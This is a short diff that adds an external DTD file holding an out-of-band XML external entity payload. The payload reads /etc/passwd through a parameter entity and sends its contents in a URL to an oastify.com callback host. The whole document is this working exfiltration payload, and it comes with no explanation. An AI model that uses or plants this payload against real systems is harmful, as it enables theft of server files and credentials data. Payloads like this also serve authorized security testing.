@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://4sx8cqiztdwqs7o89rz84wabo2utikb80.oastify.com/?data=%file;'>">
+%wrapper;
+%send;
